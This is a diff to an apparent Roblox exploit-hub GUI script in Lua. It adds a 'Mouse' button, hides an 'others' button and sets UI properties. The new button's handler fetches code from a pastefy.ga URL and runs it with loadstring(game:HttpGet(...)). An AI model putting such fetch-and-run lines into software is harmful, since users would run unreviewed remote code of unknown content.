@@ -32,7 +32,7 @@ local Ysz = Instance.new("TextButton")
 
 -- BUTTONS OTHERS
 local keyboard = Instance.new("TextButton")
-
+local mouse = Instance.new("TextButton")
 --UICorners
 local UICorner = Instance.new("UICorner")
 local UICorner_2 = Instance.new("UICorner")
@@ -52,7 +52,7 @@ local UICorner_15 = Instance.new("UICorner")
 local UICorner_16 = Instance.new("UICorner")
 local UICorner_17 = Instance.new("UICorner")
 local UICorner_18 = Instance.new("UICorner")
-
+local UICorner_19 = Instance.new("UICorner")
 
 --Properties:
 
@@ -132,7 +132,7 @@ others.TextColor3 = Color3.fromRGB(154, 154, 154)
 others.TextScaled = true
 others.TextSize = 14.000
 others.TextWrapped = true
-others.Visible = true
+others.Visible = false
 others.MouseButton1Down:connect(function()
 others.BorderSizePixel = 2
 guis.BorderSizePixel = 0
@@ -359,6 +359,22 @@ keyboard.MouseButton1Down:connect(function()
 end)
 UICorner_18.Parent = keyboard
 
+
+mouse.Name = "mouse"
+mouse.Parent = scriptinput2
+mouse.BackgroundColor3 = Color3.fromRGB(27, 32, 47)
+mouse.BorderColor3 = Color3.fromRGB(41, 64, 80)
+mouse.Size = UDim2.new(0, 200, 0, 50)
+mouse.Font = Enum.Font.FredokaOne
+mouse.Text = "Mouse"
+mouse.TextColor3 = Color3.fromRGB(191, 191, 191)
+mouse.TextScaled = true
+mouse.TextSize = 14.000
+mouse.TextWrapped = true
+mouse.MouseButton1Down:connect(function()
+ loadstring(game:HttpGet(('https://pastefy.ga/V75mqzaz/raw'),true))()
+end)
+UICorner_19.Parent = mouse
 
 
 close.Name = "close"
